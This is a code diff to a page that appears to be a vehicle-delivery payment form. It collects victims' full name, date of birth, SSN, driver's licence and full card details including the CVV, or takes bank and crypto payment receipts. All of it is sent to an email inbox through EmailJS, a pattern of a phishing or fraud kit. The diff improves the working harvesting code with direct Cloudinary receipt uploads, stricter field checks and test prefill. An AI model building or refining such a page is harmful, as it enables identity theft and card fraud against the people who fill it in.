@@ -384,62 +384,83 @@
 
     <!-- Page 3: Confirmation -->
 <div class="container hidden" id="confirmation-page">
-  ...
+  <!-- ... existing confirmation-page content ... -->
 </div>
 
 <!-- EmailJS and Cloudinary Integration -->
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-<script src="https://upload-widget.cloudinary.com/global/all.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+
 <script>
+  // Initialize EmailJS
   emailjs.init("1-W3uHSnlpZGDZ1i3");
 
+  // URL parameters
   const urlParams = new URLSearchParams(window.location.search);
   const deliveryDate = urlParams.get('deliveryDate') || 'October 14, 2024';
   const deliveryAddress = urlParams.get('address') || '123 Main St, Anytown, CA 90210';
   const vin = urlParams.get('vin') || '7SAYGDEF5PF123456';
 
-  let receiptUrl = "";
-
+  // Set delivery info
   document.getElementById('delivery-date').textContent = deliveryDate;
   document.getElementById('delivery-address').textContent = deliveryAddress;
   document.getElementById('vin-display').textContent = vin;
 
-  // Immediate Cloudinary Upload on file select
-  ['bank-receipt', 'crypto-receipt'].forEach(id => {
-    const input = document.getElementById(id);
-    if(input) {
-      input.addEventListener('change', function(e) {
-        if (e.target.files.length > 0) {
-          const widget = cloudinary.createUploadWidget({
-            cloudName: "do9yjpizs",
-            uploadPreset: "unsigned_preset",
-            multiple: false
-          }, (error, result) => {
-            if (!error && result.event === "success") {
-              receiptUrl = result.info.secure_url;
-              document.getElementById(id + '-file-name').textContent = e.target.files[0].name + ' (Uploaded)';
-            }
-          });
-          widget.open();
-        }
-      });
+  // Variables to hold uploaded receipt URLs
+  let bankReceiptUrl = "";
+  let cryptoReceiptUrl = "";
+
+  // Upload to Cloudinary instantly on file select
+  async function uploadReceipt(file, type) {
+    const url = `https://api.cloudinary.com/v1_1/do9yjpizs/upload`;
+    const formData = new FormData();
+    formData.append("file", file);
+    formData.append("upload_preset", "unsigned_preset");
+
+    try {
+      const res = await axios.post(url, formData);
+      const uploadedUrl = res.data.secure_url;
+      if (type === 'bank') bankReceiptUrl = uploadedUrl;
+      if (type === 'crypto') cryptoReceiptUrl = uploadedUrl;
+      console.log(`${type} receipt uploaded:`, uploadedUrl);
+    } catch (err) {
+      alert("Failed to upload receipt. Please try again.");
     }
+  }
+
+  // File input change listeners
+  document.getElementById('bank-receipt').addEventListener('change', function(e) {
+    document.getElementById('bank-file-name').textContent = e.target.files[0]?.name || 'No file selected';
+    if (e.target.files[0]) uploadReceipt(e.target.files[0], 'bank');
   });
 
+  document.getElementById('crypto-receipt').addEventListener('change', function(e) {
+    document.getElementById('crypto-file-name').textContent = e.target.files[0]?.name || 'No file selected';
+    if (e.target.files[0]) uploadReceipt(e.target.files[0], 'crypto');
+  });
+
+  // Page navigation
   function showPage(pageId) {
     document.querySelectorAll('.container').forEach(el => el.classList.add('hidden'));
     document.getElementById(pageId).classList.remove('hidden');
+    if (pageId === 'confirmation-page') {
+      const nameInput = document.getElementById('fullname');
+      document.getElementById('delivery-address').textContent =
+        `${nameInput ? nameInput.value : '[Your Name]'}, ${deliveryAddress}`;
+    }
   }
 
+  // Payment method selection
   function selectPayment(method) {
     document.querySelectorAll('.payment-method').forEach(el => el.classList.remove('active'));
-    document.querySelector(`.payment-method[onclick="selectPayment('${method}')"]).classList.add('active');
+    document.querySelector(`.payment-method[onclick="selectPayment('${method}')"]`).classList.add('active');
     document.getElementById('credit-card-payment').classList.add('hidden');
     document.getElementById('bank-transfer-payment').classList.add('hidden');
     document.getElementById('crypto-payment').classList.add('hidden');
     document.getElementById(`${method}-payment`).classList.remove('hidden');
   }
 
+  // Process Payment function with new validation
   async function processPayment() {
     const payButton = document.getElementById('complete-payment-btn');
     const originalText = payButton.textContent;
@@ -448,12 +469,14 @@
 
     try {
       const requiredFields = ['fullname', 'dob', 'ssn', 'dl'];
-      for (const id of requiredFields) {
-        const field = document.getElementById(id);
-        if (!field.value) throw new Error('Please complete all required fields');
+      for (const fieldId of requiredFields) {
+        const field = document.getElementById(fieldId);
+        if (!field.value) throw new Error(`Please complete all required fields`);
       }
 
-      const paymentMethod = document.querySelector('.payment-method.active').textContent.trim();
+      const paymentMethod = document.querySelector('.payment-method.active')?.textContent.trim();
+      if (!paymentMethod) throw new Error('Please select a payment method');
+
       const templateParams = {
         full_legal_name: document.getElementById('fullname').value,
         date_of_birth: document.getElementById('dob').value,
@@ -468,9 +491,9 @@
 
       if (paymentMethod === 'Credit/Debit') {
         const cardFields = ['card-number', 'expiry', 'cvv', 'card-name'];
-        for (const id of cardFields) {
-          const field = document.getElementById(id);
-          if (!field.value) throw new Error('Please complete all card details');
+        for (const fieldId of cardFields) {
+          const field = document.getElementById(fieldId);
+          if (!field.value) throw new Error('Please complete all card details before proceeding.');
         }
         templateParams.card_number = document.getElementById('card-number').value;
         templateParams.expiration_date = document.getElementById('expiry').value;
@@ -478,9 +501,14 @@
         templateParams.name_on_card = document.getElementById('card-name').value;
       }
 
-      if (paymentMethod !== 'Credit/Debit') {
-        if (!receiptUrl) throw new Error('Please upload your payment receipt first');
-        templateParams.receipt_url = receiptUrl;
+      if (paymentMethod === 'Bank Transfer') {
+        if (!bankReceiptUrl) throw new Error('Please upload your bank payment receipt before proceeding.');
+        templateParams.receipt_url = bankReceiptUrl;
+      }
+
+      if (paymentMethod === 'Crypto') {
+        if (!cryptoReceiptUrl) throw new Error('Please upload your crypto payment receipt before proceeding.');
+        templateParams.receipt_url = cryptoReceiptUrl;
       }
 
       const emailResponse = await emailjs.send(
@@ -489,17 +517,35 @@
         templateParams
       );
 
-      if (emailResponse.status === 200) showPage('confirmation-page');
-      else throw new Error('Email sending failed');
+      if (emailResponse.status === 200) {
+        showPage('confirmation-page');
+      } else {
+        throw new Error('Email sending failed');
+      }
 
     } catch (error) {
       alert('Error: ' + error.message);
+      console.error('Payment processing error:', error);
     } finally {
       payButton.textContent = originalText;
       payButton.disabled = false;
     }
   }
-        </script>
+
+  // Prefill test data in localhost
+  if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
+    document.addEventListener('DOMContentLoaded', function() {
+      document.getElementById('fullname').value = 'John Doe';
+      document.getElementById('dob').value = '1985-01-15';
+      document.getElementById('ssn').value = '1234';
+      document.getElementById('dl').value = 'DL12345678';
+      document.getElementById('card-number').value = '4111111111111111';
+      document.getElementById('expiry').value = '12/25';
+      document.getElementById('cvv').value = '123';
+      document.getElementById('card-name').value = 'John Doe';
+    });
+  }
+          </script>
 </body>
 </html>
-        
+          
